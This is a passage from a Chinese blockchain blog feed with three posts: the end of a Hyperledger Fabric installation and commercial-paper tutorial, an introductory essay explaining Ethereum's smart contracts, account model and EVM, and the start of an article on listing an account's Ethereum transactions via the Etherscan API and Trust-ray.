gcc-7.3.0.tar.gz进入gcc-7.3.0目录执行：./contrib/download_prerequisitesmkdir 一个新的目录进入该目录 cd 目录../configure --enable-checking=release --enable-languages=c,c++ --disable-multilib make (请耐心等待，我这里大概等待了2个多小时。。。)make install建议重启后再进行之后的操作 重启后看到gcc版本为7.3.0 安装Node.js 12345进入Node.js文件夹(这里可能有一个文件夹名的问题，建议修改node7.3.0文件夹名直接为node)./configuremake （耐心等待）make install建议重启后再进行之后的操作 安装npm 1npm install npm -g 完成上述操作后，查看各软件版本： 安装 Fabric首先下载Fabric源码，我们在go/src目录下新建文件夹。 123mkdir -p github.com/hyperledger进入该文件夹执行：git clone https://github.com/hyperledger/fabric.git (耐心等待) 完成后进入 fabric/scripts文件夹，可以看到bootstrap.sh脚本，cat该脚本可以看到fabric版本为1.4.0： 执行bootstrap.sh脚本，自动进行fabric相关镜像的下载,耐心等待 1./bootstrap.sh 镜像下载完成后如图： 通过Fabric-samples提供的BYFN(build your first network)构建网络。 1./byfn.sh -m generate -c jackychannel（自定义名字） 过程很快，完成后如图： 启动网络： 1./byfn.sh -m up -c jackychannel 启动后如图：完成后如图： 这个时候出现4个peer节点，通过top命令可以清楚看到： 注： 关闭命令：./byfn.sh -m down 启动网络服务后会启动排序服务节点、4个Peer节点，以及1个命令行容器cli。 搭建完成后功能测试上述步骤完成后，可是去看下一些基本的操作和命令。 1/usr/go/src/github.com/hyperledger/fabric/scripts/fabric-samples/first-network/channel-artifacts目录中,可称为创世区块目录（目录根据每个人的配置） 可以看到下列文件： Org1MSPanchors.tx、Org2MSPanchors.tx,两个锚节点配置。channel.tx，生成通道配置文件。genesis.block，创世区块文件。 1/usr/go/src/github.com/hyperledger/fabric/scripts/fabric-samples/first-network/crypto-config目录中，可称为证书目录（目录根据每个人的配置） 该目录存放生成排序服务节点和Peer节点的MSP证书文件，如图： 使用docker命令查看运行中的镜像： 1docker ps 结果如图： 进入cli来进行一些简单的操作： 1docker exec -it cli bash 切换到容器内做一个简单的查询： 1peer chaincode query -C jackychannel(刚设置启动的名称) -n mycc -c &apos;&#123;&quot;Args&quot;:[&quot;query&quot;,&quot;a&quot;]&#125;&apos; 结果会看到90余额。 票据应用测试在Fabric官网文档中有一个商业票据的例子，这里简单进行了测试。(停止Fabric网络服务后再进行以下操作。) 两个组织：MagnetoCorp、DigiBank，票据网络：PaperNet。 进入该目录启动基本网络： 12/usr/go/src/github.com/hyperledger/fabric/scripts/fabric-samples/basic-network./start.sh 启动完成后查看：docker ps 会出现4个运行中容器。 使用：docker network inspect net_basic命令查看docker网络： 进入以下目录，启动： 12cd commercial-paper/organization/magnetocorp/configuration/cli/./monitordocker.sh net_basic 出现下图： 另外开一个终端连接到服务器，在之前目录下，创建MagnetoCorp公司特定的docker容器。 12cd commercial-paper/organization/magnetocorp/configuration/cli/docker-compose -f docker-compose.yml up -d cliMagnetoCorp 再输入：docker ps 可以看到fabric-tools：3f078207c01a已加入网络中： MagnetoCorp 管理员通过fabric-tools：3f078207c01a来进行操作。 接下来看下智能合约：进入以下目录： 1cd /usr/go/src/github.com/hyperledger/fabric/scripts/fabric-samples/commercial-paper/organization/magnetocorp/contract/lib 该目录下三个文件，其中papercontract.js为商业票据的智能合约。可以cat看下具体内容，这里暂不展开。 执行如下部署合约代码： 1docker exec cliMagnetoCorp peer chaincode install -n papercontract -v 0 -p /opt/gopath/src/github.com/contract -l node 实例化智能合约： 1docker exec cliMagnetoCorp peer chaincode instantiate -n papercontract -v 0 -l node -c &apos;&#123;&quot;Args&quot;:[&quot;org.papernet.commercialpaper:instantiate&quot;]&#125;&apos; -C mychannel -P &quot;AND (&apos;Org1MSP.member&apos;)&quot; 输入如下： 之前打开的终端中会有输出，也就是logsout容器的中的日志输出内容，具体如下： 再次docker ps就可以看到：dev-peer0.org1.example.com-papercontract-0，说明此容器是peer0.org1.example.com节点启动的，且正在运行的papercontract链码版本为0。 MagnetoCorp Application进行票据发行: 过程图： MagnetoCorp的Isabella发起整个交易过程。 进入以下目录： 1cd /usr/go/src/github.com/hyperledger/fabric/scripts/fabric-samples/commercial-paper/organization/magnetocorp/application 可以看到下列文件:eslintrc.js、issue.js、package.json、addToWallet.js、node_modules 1node addToWallet.js 在执行上述命令的时候，强烈建议先进行如下操作：这几个坑一般都存在~~ 123456789修改package.json文件vi package.json把里面1.0.0版本改成1.4.0npm install（如报错执行下列命令）npm install --unsafe-perm fabric-network如有：Error: /lib64/libstdc++.so.6: version `CXXABI_1.3.9&apos; not found 报错那么执行下列命令：find / -name &quot;libstdc++.so.6*找到文件的指定目录，笔者这里是6.0.24，复制到/lib64目录、删除之前的libstdc++.so.6文件，执行如下命令链接：ln -s libstdc++.so.6.0.24 libstdc++.so.6 再删除之前的node_modules文件夹，再次执行： 123npm install（如报错执行下列命令）npm install --unsafe-perm fabric-networknode addToWallet.js 这个时候正常的话会出现done，如图： 查看钱包的结构： 12ll ../identity/user/isabella/wallet/ll ../identity/user/isabella/wallet/User1\@org1.example.com 结果如下图： Isabella钱包信息:用户私钥：c75bd6911aca808941c3557ee7c97e90f3952e379497dc55eb903f31b50abc83-priv用户公钥：c75bd6911aca808941c3557ee7c97e90f3952e379497dc55eb903f31b50abc83-pub用户证书文件：User1@org1.example.com 发起交易：Isabella现在可以使用issue.js来提交一个交易（发行MagnetoCorp 公司的商业票据00001） 1node issue.js 结果如图： 以上操作都是在MagnetoCorp的Isabella，接下来是，DigiBank-Balaji ，他将购买刚刚发行的商业票据。 购买流程图： 进入下列目录： 12/usr/go/src/github.com/hyperledger/fabric/scripts/fabric-samples/commercial-paper/organization/digibank/configuration/cli执行：docker-compose -f docker-compose.yml up -d cliDigiBank 结果如图： 12cd /usr/go/src/github.com/hyperledger/fabric/scripts/fabric-samples/commercial-paper/organization/digibank/applicationvi buy.js buy.js文件可查看合约内容. 和之前npm的操作一样、修改相关文件内容： 1234修改package.json文件vi package.json # 把里面1.0.0版本改成1.4.0npm install（如报错执行下列命令）npm install --unsafe-perm fabric-network 创建账户及购买，商业票据00001生命周期的最后一个交易是redeem交易，Balaji 通过运行redeem.js程序来实现这一过程。 123node addToWallet.js node buy.jsnode redeem.js 在执行过程中可能会出现： 那么执行： 1npm install -g js-yaml 结果如图： 整个实验大致完成。 参考文章： https://www.jianshu.com/p/cb032c42c909 https://blog.csdn.net/ASN_forever/article/details/87859346 https://hyperledger-fabric.readthedocs.io/en/latest/ 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客 。]]></content>
      <categories>
        <category>Fabric</category>
      </categories>
      <tags>
        <tag>Fabric</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科普 | 再谈：以太坊是什么]]></title>
    <url>%2F2019%2F04%2F20%2Fmore-about-ethereum%2F</url>
    <content type="text"><![CDATA[大概整整两年前，我从一篇介绍“区块链”技术的文章里知道了“以太坊”这个项目，当时当然没想到它会对我个人产生如此大的影响。在其后这两年时间里，我投入了大量的时间和精力来学习它、研究它，做了多次技术分享，甚至还写了讲解智能合约开发的书、开发了关于智能合约开发的在线课程；所以不管未来我们各自的走向如何，以太坊都已经在我生命中留下了重重的一笔。在我们相识两周年之际，我觉得我总该要写点儿什么。 序言新年的这第一个月我过的很充实：只感了两次冒，每次大概半个月……。本来我是计划在月底前写完技术专题“工程师眼中的比特币和以太坊”的，可惜也无奈地再次被教育了：“年龄不是问题，但身体是问题。”所以临近月底只能以这篇文章勉强交个作业吧。 2017 年底的时候，我曾在简书发过一篇博客，介绍“以太坊是什么”，但那是一篇对以太坊 Homestead 官方文档的翻译稿节选。客观地讲，当时我本人对以太坊的理解也还不是非常深入透彻，所以这篇原创的“再谈：以太坊是什么”还是有一些参考价值的，我相信这篇文章也许比一年前的那篇翻译稿更好懂一些，而且真正讲出了一些“本质性”的基本概念。 当然，这不是一篇 hardcore 的技术文章，我的初衷是基于我本人对以太坊的理解，从概念上给那些还不是很清楚地知道“以太坊是什么”的朋友做一个简单的扫盲。这也是我写这个新的技术专题的初衷：我希望让更多软件工程师能了解区块链、了解智能合约，希望有更多的人能真正搞懂一些最基本的概念，并以此为契机深入到区块链和智能合约的世界中。 因为本文的主体内容选自我的技术专题“工程师眼中的比特币和以太坊”，所以文中对比特币系统技术细节的引述可能会略显突兀、缺少铺垫；如果你对比特币的技术细节还不了解，也可能会引起一些迷惑，对此我也表示歉意。不过我还是希望你能喜欢本文的内容和讲解方式；此外如果能给我提供任何形式的反馈，我也将感激不尽。完整阅读本文约需要 15 到 20 分钟。 时间已经来到了 2019 年 1 月，相信对很多人来讲，“区块链”这个词恐怕已经不陌生了，并且大概也已经听过“比特币”的名号；不过，如果有人问你：“以太坊是什么”，你能够很清晰、准确地给他解释清楚吗？ 我想如果你看过“以太坊白皮书（Ethereum White Paper）”，你大概会用它的标题来回答这个问题：“A Next-Generation Smart Contract and Decentralized Application Platform”，翻成中文就是“下一代的智能合约和去中心化应用程序平台”。没错，这很权威，也很准确。但是，我想即使对于软件工程师来讲，这个答案中引入的两个新概念“智能合约”和“去中心化应用程序”其实也并不那么“一目了然”。显然，我们不应该用未知的概念去解释其他未知的概念。不过我想这仍然称得上是一个不错的开端，就让我先沿着这个思路聊聊“智能合约”和“去中心化应用程序”吧。 什么是智能合约智能合约（Smart Contract）这个词最初是由一位美国的计算机科学博士尼克萨博（Nick Szabo）在他 1997 年发表的一篇论文中提出来的。智能合约指的是一种基于计算机技术实现的，可以免除人工干预而自动执行、自动校验、自动基于外部指令给出回应的具有交互性或者互操作性的合约；其本质是一种计算机程序。这个概念本身相对比较抽象，所以尼克萨博本人在后来的一些访谈中曾经用自动取款机或者自动售货机来作为智能合约的物理实例；它们就是基于某些公开的、众所周知的规则，能够根据用户的指令和实际业务数据的状态给出可预期的回应的这样一种应用程序。 自动售货机例子比如我们去自动售货机购买某种商品，我们先要选择商品和购买数量，如果自动售货机中库存不足，它应该会给出相应的提示；如果库存充足，它会提示用户进行实际支付，比如用现金或者电子支付；如果支付金额不足，它会给出提示，并继续等待，直到支付金额足够或者用户取消交易；如果支付金额足够，它们就会吐出正确数量的商品，并进行找零。自动售货机在这整个过程中对用户操作的响应应该是确定的、可预测的、可自动完成的，当然也应该是正确的。那么能够基于实际情况给出这些正确响应的程序，就可以认为是智能合约。 当然，其实这个过程并不“智能”，从某种意义讲，也并不是“合约”。所以这个词从其诞生开始就有一些争议，尤其是它会给一些不明所以的用户某种程度的误解。从本质来看，所谓“智能合约”实际上只是一种可以基于某种状态数据自动给出回应的应用程序而已。不过出于历史原因，“智能合约”的叫法还是被业内接受并延用了下来。 智能合约有什么用这里我仅举两个最简单的例子来解释智能合约的意义。 租房合约例子首先是一个租房合约的例子。比如我和房东订立了一个租房合约，约定我每月付给房东 1000 元房租，合约期限为一年。在没有智能合约的情况下，这个合约的履行是需要很多人工介入的，我付钱的动作必须由我主动完成；如果出现意外情况，也需要第三方的介入才能解决，比如中介机构的居间调停乃至民事诉讼、强制执行等等。而如果有一种无需信任的智能合约平台，这整个过程就可以变为下面这样： 我和房东可以在某个智能合约平台上订立一个智能合约，创建合约的时候，我将一年的租金锁定到合约里，然后从订立合约开始，每经过一个月，房东可以从合约中提取一个月的租金，直到合约期限完结或者经双方确认中止合约，合约自动给我退回剩余未支付的租金。这样的场景是可以在像以太坊这样的智能合约平台上简单实现的，这整个过程无需任何第三方介入，并且可以保证执行的过程严格按照约定的条件完成。 请注意，这个过程是“无需信任（trustless）”的。也就是合约双方不需要相互认识乃至相互信任，而是基于一种不可篡改、不可抵赖、不可逆转的自动化的技术方案保证了整个过程的可信性，同时不需要任何第三方的介入。这就是智能合约带来的最重要的特性。 当然，这个例子中的一些细节是和我们普遍采用的人工处理的方式有差异的：比如我要支付的一年的租金是需要在订立合约时就要锁定到合约里的，而不是可以像人工操作的方式那样每月提供；又比如要中止合约时是需要双方确认的，如果有一方故意不进行确认，那么合约会被锁死，这需要事先考虑到，并在合约中设计相应的解决方法。不过即使存在实操上的差异，这种自动化的、不可抵赖的智能合约选项依然称得上是一种进步。 保险例子第二个例子是一个简单的保险。比如某地区的一个农民可以与某保险公司订立一份合约，合约条款大概可以是这样：该农民于今年 6 月 30 日前支付 x 元保险费给保险公司；如果今年 7 月到 9 月某地区的平均降雨量不足 100 毫米，则农民可以在 9 月 30 日之后得到 y 元的保险赔偿；否则无需赔偿。 这个保险，同样可以用像以太坊这样的智能合约平台简单地实现：农民和保险公司可以在 6 月 30 日之前订立合约，农民将 x 元、保险公司将 y 元同时锁定到这个合约中；在 9 月 30 日之后，农民或者保险公司都可以向合约申请执行；合约可以自动从无利益关系的第三方公共服务（比如气象台网站）获取 7 月到 9 月的降水量信息；如果降水量低于 100 毫米，则将 x + y 元支付给农民，反之则将 x + y 元支付给保险公司。这整个过程同样无需人工介入，可以基于智能合约自动完成。 这个例子中提到的“无利益关系的第三方公共服务”，通常是通过一种区块链系统/智能合约平台以外的独立数据源来提供的。这是因为区块链系统本身无法产生或者直接获取某些特定的数据，比如天气数据、股票价格等等，那么就需要独立的“链外”数据提供方来提供具体的数据。这种提供链外数据的服务，也就是所谓的“预言机（Oracle）”。因为本文只是扫盲性质，这里不再具体展开了。 所以，从逻辑概念上看，智能合约可以理解为一种会经过“技术公证”的状态存储和状态转换（也就是程序执行），以此来确保这个过程“无需信任”。（稍后我会从技术角度来解释这个概念。） 去中心化应用程序又是什么在理解了智能合约的概念之后，再来理解去中心化应用程序就比较容易了。目前的绝大多数 Web 应用，其用户数据都是保存在由某个公司、组织或者个人控制的“服务器”或者“服务器组”之中的，这些应用中的绝大部分业务计算，也是由这些服务器或者服务器组来提供的；所以这种模式，可以认为是一种“中心化（centralized）”的模式。 那么“去中心化应用程序（Decentralized Application）DApp”，也就是将数据保存到“基于点对点网络的时间戳服务器（即区块链）”这样的，并不是由中心化的公司或组织控制的服务中，并且由这样的“去中心化”服务来提供具体的业务数据计算能力的一种应用程序。“去中心化应用程序”也可以简单地理解为是基于智能合约进行状态追踪和计算的一种应用程序。 这里的“基于点对点网络的时间戳服务器”的说法是出自比特币白皮书，这也是“区块链”一词的原始出处。 当然，对于一个应用程序来讲，并不是所有运算都需要用智能合约来实现，通常也不应该这样设计；而是应该根据业务需求，将那些需要做“全网公证”的状态计算在智能合约中实现，来使应用程序获得某些“无需信任”的可信性。 好了，在了解了智能合约和去中心化应用程序的基本概念之后，我相信你已经大概知道以太坊是什么了。这里再重复一下：以太坊就是一个智能合约和去中心化应用程序平台。 不过，我还有第二种答案。请你稍安勿躁，让我尝试基于以太坊的总体设计思路和技术方案概要来慢慢为你揭晓。 以太坊的诞生与比特币不同，以太坊白皮书的作者不是匿名的，它的初稿是由 Vitalik Buterin 于 2013 年底完成的。Vitalik 在 1994 年出生于俄罗斯，后来随父母移居加拿大，在写出以太坊白皮书的时候，他只有 19 岁，刚刚从滑铁卢大学大一辍学。不过，在他写出以太坊白皮书之前，他已经是一个知名的比特币研究者和写作者，他也是在 2011 年创刊的世界上第一个加密货币期刊——Bitcoin Magazine 的联合创始人。可以说，以太坊白皮书并不是像比特币白皮书那样“凭空出现的”。Vitalik 本人从 2013 年下半年就开始思考如何对比特币的脚本系统进行扩展来支持“通用目的”的计算任务。 2013 年 12 月，Vitalik 完成了以太坊白皮书，并在小范围内进行了分享，引起了一些业内人士的关注，其中就包括了“精通比特币（Mastering Bitcoin）”一书的作者 Andreas M. Antonopoulos，但他当时在忙于写作精通比特币，所以并未直接参与以太坊创建初期的具体工作。真正在工程上帮助 Vitalik 实现了以太坊这个伟大构想的则是 Gavin Wood 博士。 Gavin Wood 博士是英国约克大学的计算机科学博士，在以太坊项目最初的两年里，他是在工程上贡献最大的人：他于 2014 年 1 月完成了以太坊的 PoC-1（即第一个概念验证程序，也是以太坊的 C++ 客户端的最初原型）；随后在 3 月发表了以太坊黄皮书（即以太坊协议的细节说明和技术手册，是实现以太坊客户端的基础技术资料，在工程上具有极其重要的指导意义，它也是我们了解和学习以太坊协议技术细节的主要参考资料）；同年 8 月公布了专门为智能合约开发而设计的高级语言 Solidity。2015 年 7 月 30 日，以太坊主网正式上线，创世区块产生，世界上第一个成功的公共智能合约平台才真正诞生。 以太坊的开创意义在于：它借鉴了由比特币系统创造出来的“通过工作量证明算法达成共识的、基于点对点网络的时间戳服务器”（也就是所谓的“区块链”），构建出了一种可以执行“通用目的”计算任务的基础设施，将“区块链”的可编程性提升到了一个新的高度；创造出了真正的“智能合约”平台。 区块链范式从技术层面讲，我们可以把类似于比特币这样的、通过分布式共识进行“公证”的公共账本系统（也就是所谓的“区块链”）抽象地理解为一个“状态转换系统（state transition system）”。这种系统会维持一个“全局的状态”（我们用 S 来表示），然后通过系统中发生的“交易”（我们用 tx 来表示）来进行相应的状态转换以达到一个“新的全局状态”（我们用 S’ 来表示）。那么这种状态转换就可以抽象地表示为：Apply(S, tx) = S’，其中的 Apply 即“状态转换函数”。 下图是比特币中的状态转换示意： 图中用 1&lt;txid&gt;:&lt;output_index&gt;的形式来表示某个 UTXO：其中 txid 即交易哈希，用来标识某个具体的交易；output_index 即交易生成的输出（UTXO）的索引。 UTXO，即 Unspent Transaction Output，是基于比特币的数据模型产生的一个术语。比特币中的交易都是由若干输入（Input）和若干输出（Output）组成的。按照协议约定，一个输入必定是某个历史交易的某个输出的引用，通过在输入中包含特定的“解锁脚本（unlocking script）”来对历史交易的输出中指定的“锁定脚本（locking script）”进行解锁，以此来“消耗/使用（spend）”相应的输出。那些未被任何“输入”引用过的“输出”就是 UTXO。 如上图所示，比特币中的交易会消耗/使用若干 UTXO，并通过合并和拆分来生成等量的新的 UTXO。上图中的实例就是通过 7b53ab84 这个交易的第 1 个输出和 3ce6f712 这个交易的第 2 个输出来生成了 3 个新的 UTXO，即 bb75a980 这个交易（也就是上图中这个交易）的输出 0、1 和 2。于是，系统整体的状态，就从 5 个 UTXO 变为了 6 个 UTXO。 所以，比特币系统其实就是一个对当前系统中所有可用的 UTXO 的状态记录，它通过一个具体交易来对当前可用的若干 UTXO 进行合并和拆分来生成新的 UTXO，并将系统状态转换为新的 UTXO 集合；同时，这个过程是在一个点对点网络中进行“全网公证”的。 考虑到像比特币这样的“区块链”系统是以区块为单位来打包记录交易的，我们其实已经可以对“区块链”下一个技术上的定义了：“区块链”，其实就是一个通过交易来触发状态变动，并以区块为单位来记录状态变动的状态转换系统。刚刚介绍过的状态转换范式 Apply(S, tx) = S’，也就是所谓的“区块链范式（blockchain paradigm）”。 请注意，这是一个通用的范式，它适用于比特币，也适用于以太坊，并且同样适用于其他类似于比特币和以太坊这样的基于“区块链”的分布式共识账本系统。而不同的区块链系统的差别就在于如何表示系统中的状态以及如何定义状态转换函数（也就是交易）。 那么，对于目标是要实现一个“智能合约平台”的以太坊来讲，使用比特币的 UTXO 模型来保存系统状态和构造交易数据可行么？ 以太坊的“账户模型”和“存储”在刚刚介绍智能合约的概念时我提到过：智能合约其实可以看作是一种用于记录和修改“状态”的应用程序。从计算机科学的角度来看，这其实就是“状态机（state machine）”。每个智能合约，都可以看作是一个自定义的状态机。那么对于“智能合约平台”而言，最关键的特性就是允许用户自定义状态机，同时保证这些自定义状态机可以自动地、正确地、不可篡改地执行，且执行过程应该被进行“技术公证”，以此来保证合约参与方之间“无需信任”。 很明显，“技术公证”的问题已经被比特币解决了：我们只需要把所有自定义状态机的状态数据保存到区块链上，通过工作量证明算法达成共识，实际上就实现了对自定义状态数据的“全网公证”。但是，如何将“自定义状态”保存到区块链上呢？比特币的 UTXO 模型能够做到么？ 简单地说，参考业内到目前为止的研究和工程实践成果，基于 UTXO 模型来保存自定义状态数据大概是可行的，但相对而言会非常复杂，或者需要一些特殊的简化或限制。（因为篇幅原因，这里不做详细解释了。）所以以太坊采用了简单直接的“账户模型（account model）”，这与我们已经非常熟悉的大部分中心化软件系统中所使用的数据模型非常相似。 以太坊账户模型在以太坊的账户模型中，用“地址（address）”来作为账户的全局唯一标识，将自定义状态数据与地址进行绑定来实现快速查找、增删和修改；这种思路就像我们在传统的业务系统中所使用的账户数据模型那样，通过唯一的用户账户标识来关联所有业务数据。这可以说是一种为了实现通用应用平台而进行的工程上的设计妥协和技术简化。 在账户模型中，每个账户都有一个表示其可用“余额（balance）”的字段，来记录其以太币（以太坊协议中的代币）数量。而在比特币系统中，一个所谓的“账户”是可以持有（使用）多个 UTXO 的，我们在客户端或者钱包中看到的“账户余额”实际上是这个账户持有的（可以使用的）所有 UTXO 的比特币数量之和。比特币中的交易是对可用 UTXO 的合并和拆分，而不是像账户模型这样直接对余额数值进行增减。 以太坊中的“账户”，逻辑上分为两种：EOA（External Owned Account，即由外部用户基于椭圆曲线数字签名的私钥控制的账户，可简称外部账户）和 Contract Account（即合约账户）。不过从底层基础数据上看，这两种账户是一样的，它们的区别仅在于账户是否与合约代码相关联：如果一个账户没有关联代码，它就是 EOA（外部账户）；否则它就是合约账户。 以太坊存储结构 Merkle Patricia Tree应该注意到，对于自定义状态机来讲，需要持久化保存的应该是自定义状态数据和用来修改状态数据的可执行代码，这其实就是所谓的“合约状态”和“合约代码”。对于智能合约平台来讲，必须能够持久化地保存这两种数据。基于账户模型，以太坊使用了一个全局的数据结构来保存所有的合约状态和合约代码。因为合约是可以由用户自定义的，所以保存这些数据的数据结构必须是可以进行高效的动态查找、增删和修改的，并且是可以进行简单验证的。以太坊中就使用了一种叫做 Merkle Patricia Tree（简称 MPT）的数据结构来实现这一点。 MPT 与比特币系统使用的 Merkle Tree 类似，也是一种“哈希树”，所以它们具有相同的特性：任意叶节点数据的变动都会导致根节点哈希的变动，所以根节点哈希可以用来标识树中所有数据的某个特定的版本。基于这个原理，就可以在点对点网络的参与者之间通过由各个客户端分别维护的一个全局 MPT 的根节点哈希来验证所有自定义状态数据、账户余额和代码数据的版本一致性。这个全局的 MPT 也就是以太坊的“状态树（state tree）”，它相当于比特币系统中所有可用 UTXO 的全集。 以太坊中用来保存所有自定义状态数据的全局 MPT 被称为“存储（storage）”，它是独立于“状态树”之外的另一个全局 MPT，但因为其根节点哈希是作为账户数据的一个字段来保存的，所以它实际上也是“状态树”的一部分。 以太坊中的每个合约账户都可以在“存储”中使用若干“存储单元（storage slot）”：每个合约的代码中可以自定义若干状态数据，每个状态数据对应一个或多个“存储单元”；这些存储单元都可以通过简单的寻址算法进行存取操作。这就是以太坊的持久化数据存储方案。 以太坊中的“状态转换”基于“账户模型”和“存储”，以太坊中的状态转换自然也就有了不同的形式。下图是以太坊中的状态转换示意： 图中演示了以太坊中的一个由交易引发的状态转换：在初始状态 State 中，14c5f8ba、bb75a980、892bf92f 和 4096ad65 代表了 4 个账户地址，其中 14c5f8ba 和 4096ad65 是 *EOA 外部账户 *，bb75a980 和 892bf92f 则为合约账户（因为有关联代码）。然后图中所示的交易，其逻辑意义也很简单，即从 14c5f8ba 向 bb75a980 发送 10 以太币，并附加了一些额外的数据 Data，这个 Data 数据的意思是将目标合约的第 2 个“存储单元”的数值设定为“CHARLIE”。这个交易的执行会产生一个新的状态 State’，其中 14c5f8ba 地址的余额减少了 10 以太币，bb75a980 地址的余额增加了 10 以太币，并且 bb75a980 地址的第 2 个“存储单元”的数值变为了“CHARLIE”。 很明显，因为基础数据模型的改动，以太坊中的状态转换与比特币中的状态转换几乎完全不同。与之相应地，构造交易、验证数据等等的逻辑自然也会完全不同。当然，这里只是一个示意介绍，实际上在以太坊的交易中附加的 data 是一种“可执行代码”，是可以由用户自定义的，用户可以用这些具体的代码来执行任意的计算任务；这种方式与在比特币交易的输入和输出中附加脚本代码是类似的。 以太坊中的“可执行代码” - EVM在以太坊协议中，我们可以在交易的 data 字段中附加一种特殊的“可执行代码”来完成任意的计算任务，这种“可执行代码”是在一个虚拟的执行环境中运行的。与比特币脚本系统的执行环境类似，以太坊的这种虚拟执行环境也是基于“栈（stack）”的；但以太坊的虚拟执行环境还提供了可以供应用程序在运行时使用的临时存储空间“内存（memory）”和刚刚介绍过的永久存储机制“存储（storage）”。这就使以太坊的虚拟执行环境有了更强的计算能力，更像是一种“虚拟的计算机”，这个虚拟的执行环境就是大名鼎鼎的“以太坊虚拟机（Ethereum Virtual Machine，简称 EVM）”，EVM 也是以太坊被称为“世界计算机（World Computer）”的由来，它也是以太坊与比特币相比在技术层面的最大创新。 以太坊协议中的这种可以在 EVM 中运行的“可执行代码”就是所谓的“EVM 字节码”。EVM 字节码是以太坊计算能力的根本，这是一种“图灵完备（Turing-complete）”的操作码系统。以太坊的高级开发语言 Solidity 就可以编译为 EVM 字节码，然后在 EVM 中运行；这种方式与其他编译型的高级语言是类似的，就像 Java 语言和 Java 虚拟机字节码的关系那样。 EVM 字节码的图灵完备性，也是其与比特币的脚本系统相比最大的区别。图灵完备性标志着 EVM 字节码可以用来完成任意的计算任务，同时因为 EVM 中还提供了临时存储机制和永久存储机制，这才使以太坊成为了真正的可以完成“通用目的（general propose）”计算任务的“智能合约平台”。 小结至此，我想我可以再回答一下“以太坊是什么”这个问题了：以太坊其实就是“区块链”+“以太坊虚拟机”。 就本文的目的而言，你记住这个答案就够了。 当然，以太坊并不像本文中说的这么简单，还有许许多多的技术细节等待着你去学习理解，文中所提及的术语大多也可以进行更多的技术解读。但就像我在引言中说的那样，本文的目的仅仅是去尝试解释一些最基本、最重要的概念，帮助你进入区块链和智能合约的世界。希望你读完本文之后能有些许收获。我也要感谢能耐着性子看到这里的朋友！ 彩蛋：本文中的两个插图都是从以太坊白皮书中抄来的，细心的你可能会发现：以太坊的状态转换示意图中交易数据的 From 地址写错了！是的，你没看错，就是写错了。如果你发现了这个错误，我必须恭喜你，你是个细心人，大概是做技术的人才。而没有发现的朋友可能需要检讨一下了……。当然，也请不要多想，我引用这个错误的图片，仅仅是因为我不会 PS，然后还懒，所以这个锅只能 V 神背了……。 编者注：本文作者风静縠纹平（作者的简书）是以太坊资深专家，经作者本人授权转载。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>以太坊</category>
      </categories>
      <tags>
        <tag>以太坊入门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何开发一款以太坊安卓钱包系列6 - 获取账号交易列表]]></title>
    <url>%2F2019%2F04%2F19%2Feth-wallet-dev-6%2F</url>
    <content type="text"><![CDATA[这是如何开发以太坊安卓钱包系列第6篇，获取账号交易列表: 以太转账、代币 Token（通证）转账及合约调用列表。 交易列表功能几乎每一个数字钱包都会把账号的交易列表展示出来，像下面这样一个列表: 这篇文章来看看如何来实现交易列表，首先得了解一点：以太坊官方的节点服务不提供获取某一个地址的历史交易。 因此实现交易列表需要把区块的交易记录扫描存储在数据库，并由服务器提供交易查询功能接口，过程如下： 看上去这个工作量还挺大， 不过已经有人帮我们帮我们造好轮子了：有相应的第三服务和开源框架。 Etherscan 服务Etherscan 是以太坊上应用最广泛的区块链浏览器，也同时提供 API 服务, 实现交易列表功能其中一个选择就是使用Etherscan API 服务。 Etherscan API 主要包含模块有： 账号地址相关接口 智能合约相关接口 交易相关接口 区块相关接口 事件日志相关接口 Tokens代币相关接口 状态相关接口 一些相关工具相关接口 交易列表API，是在账号地址相关接口提供的，接口如下： 1/api?module=account&amp;action=txlist&amp;address=&amp;apikey=YourApiKeyToken 深入浅出区块链对Etherscan API 进行了翻译，大家可以点击查看了解更多API使用。 这个接口来获取某个账号地址的交易记录，如请求这个地址返回的结果如下： 123456789101112131415161718192021222324&#123; "status": "1", "message": "OK", "result": [&#123; "blockNumber": "47884", "timeStamp": "1438947953", "hash": "0xad1c27dd8d0329dbc400021d7477b34ac41e84365bd54b45a4019a15deb10c0d", "nonce": "0", "blockHash": "0xf2988b9870e092f2898662ccdbc06e0e320a08139e9c6be98d0ce372f8611f22", "transactionIndex": "0", "from": "0xddbd2b932c763ba5b1b7ae3b362eac3e8d40121a", "to": "0x2910543af39aba0cd09dbb2d50200b3e800a63d2", "value": "5000000000000000000", "gas": "23000", "gasPrice": "400000000000", "isError": "0", "txreceipt_status": "", "input": "0x454e34354139455138", "contractAddress": "", "cumulativeGasUsed": "21612", "gasUsed": "21612", "confirmations": "7525550" &#125;]&#125; 请求 token 的交易记录，则使用 API 的 action 参数是 tokentx ， 大家可以在浏览器请求这个接口试试，返回的数据格式和上面的接口是一样。 此接口在测试网络下也使用，只是所使用的域名不同，目前支持的三个网络的域名为： https://api-ropsten.etherscan.io/https://api-kovan.etherscan.io/https://api-rinkeby.etherscan.io/ 自建区块服务Etherscan API 是社区提供的服务，仅支持每秒 5 个GET或POST请求，如果我们要做一个商业级的产品，使用 Etherscan API 显然没法满足需求，这就需要需要自建服务，这也是登链钱包 所采用的方式。 自建服务并不意味着我们需要从头开始写所有的代码，使用Trust Wallet开源的Trust-ray 框架（为了保证版本一直，我fork了一份）是个很好的选择。 Trust-ray 是一个Node项目，服务如何搭建请大家订阅小专栏查看，这里简单介绍下 Trust-ray 服务的逻辑，更多细节还需大家阅读 Trust-ray 的代码。 Trust-ray 解析区块Trust-ray 提供的功能有两块：一个是扫描解析区块， 一个是提供API服务。Trust-ray 扫描解析区块逻辑在 common 目录下，入口是ParseStarter.ts 大家最好对照代码阅读，大致解析逻辑（有删减）如下： sequenceDiagram Title: Trust-ray 解析区块逻辑序列图 Note left of ParseStarter: 调用 start() ParseStarter->>BlockchainState: getState ParseStarter->>BlockchainParser: start BlockchainParser->>TransactionParser: parseTransactions BlockchainParser->>TokenParser: parseERC20Contracts Note right of BlockchainParser: 写入MongoDB Trust-ray 提供接口服务Trust-ray 比较坑的一点时，代码虽然开源了，可以没有提供一丁点文档，要知道 Trust-ray 提供了哪些 API 只有查看代码，在ApiRoutes.ts 文件中列出了所有接口。 提供接口服务的代码在 controllers 下，接受请求对应的 Controller 会根据请求参数查询 MongoDB 